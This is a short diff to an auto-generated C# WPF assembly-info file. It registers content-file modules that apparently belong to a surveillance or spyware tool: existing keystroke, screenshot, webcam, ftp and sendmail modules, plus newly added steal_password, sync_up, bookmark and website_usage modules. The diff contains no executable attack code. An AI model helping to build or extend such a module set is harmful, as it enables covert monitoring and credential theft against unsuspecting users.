@@ -8,10 +8,14 @@
 // </auto-generated>
 //------------------------------------------------------------------------------
 
+[assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/bookmark.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/ftp.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/keystroke.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/screenshot.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/sendmail.exe")]
+[assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/steal_password.exe")]
+[assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/sync_up.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/webcam.exe")]
+[assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/website_usage.exe")]
 
 
